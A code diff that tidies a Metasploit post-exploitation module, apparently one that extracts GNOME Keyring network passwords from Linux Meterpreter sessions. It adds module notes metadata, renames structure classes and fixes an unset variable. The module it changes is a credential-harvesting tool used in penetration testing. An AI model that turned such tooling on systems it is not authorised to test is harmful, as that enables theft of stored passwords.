@@ -20,6 +20,11 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Platform' => [ 'linux' ],
         'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -34,14 +39,14 @@ class MetasploitModule < Msf::Post
     )
   end
 
-  class GList_x64 < BinData::Record
+  class GListX64 < BinData::Record
     endian :little
     uint64 :data_ptr
     uint64 :next_ptr
     uint64 :prev_ptr
   end
 
-  class GList_x86 < BinData::Record
+  class GListX86 < BinData::Record
     endian :little
     uint32 :data_ptr
     uint32 :next_ptr
@@ -50,10 +55,10 @@ class MetasploitModule < Msf::Post
 
   # https://developer.gnome.org/glib/unstable/glib-Doubly-Linked-Lists.html#GList
   def struct_glist
-    session.native_arch == ARCH_X64 ? GList_x64 : GList_x86
+    session.native_arch == ARCH_X64 ? GListX64 : GListX86
   end
 
-  class GnomeKeyringNetworkPasswordData_x64 < BinData::Record
+  class GnomeKeyringNetworkPasswordDataX64 < BinData::Record
     endian :little
     uint64 :keyring
     uint64 :item_id
@@ -67,7 +72,7 @@ class MetasploitModule < Msf::Post
     uint64 :password
   end
 
-  class GnomeKeyringNetworkPasswordData_x86 < BinData::Record
+  class GnomeKeyringNetworkPasswordDataX86 < BinData::Record
     endian :little
     uint32 :keyring
     uint32 :item_id
@@ -83,7 +88,7 @@ class MetasploitModule < Msf::Post
 
   # https://developer.gnome.org/gnome-keyring/stable/gnome-keyring-Network-Passwords.html#GnomeKeyringNetworkPasswordData
   def struct_gnomekeyringnetworkpassworddata
-    session.native_arch == ARCH_X64 ? GnomeKeyringNetworkPasswordData_x64 : GnomeKeyringNetworkPasswordData_x86
+    session.native_arch == ARCH_X64 ? GnomeKeyringNetworkPasswordDataX64 : GnomeKeyringNetworkPasswordDataX86
   end
 
   def init_railgun_defs
@@ -186,6 +191,7 @@ class MetasploitModule < Msf::Post
     begin
       address = session.net.resolve.resolve_host(name)[:ip]
     rescue Rex::Post::Meterpreter::RequestError
+      address = nil
     end
     @hostname_cache[name] = address
   end
